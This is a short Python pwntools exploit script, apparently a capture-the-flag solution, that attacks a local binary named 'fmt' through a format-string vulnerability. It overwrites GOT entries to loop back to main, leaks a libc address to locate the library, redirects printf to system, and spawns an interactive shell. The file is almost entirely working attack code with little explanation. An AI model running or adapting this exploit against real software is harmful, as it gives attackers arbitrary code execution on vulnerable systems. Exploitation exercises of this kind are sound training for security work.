#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from brucepwn import *

elf = ELF("./fmt")
libc = elf.libc
r = elf.process()
main = 0x804853b

# construct format string payload
payload = p32(elf.got.__stack_chk_fail) + p32(elf.got.__stack_chk_fail+2) + p32(elf.got.__libc_start_main)
fmt = FmtStr(payload, printed=12)
fmt.write(main&0xffff, 10, 2) # write main&0xffff to memory address at index ( stack position ) 10, 2 btyes 
fmt.write(main>>16, 11, 2)
fmt.raw("dildo%12$s") # for leaking libc_start_main
fmt.pad(101)
r.sendline(str(fmt))

r.recvuntil("dildo")
libc.address = u32(r.recv(4)) - libc.symbols.__libc_start_main
log.success("libc: {:#x}".format(libc.address))

system = libc.symbols.system
payload = p32(elf.got.printf) + p32(elf.got.printf + 2)
fmt.new(payload, printed=8)
fmt.write(system&0xffff, 10, 2)
fmt.write(system>>16, 11, 2)
fmt.pad(101)
r.sendline(str(fmt))
r.sendline("sh")
r.interactive()
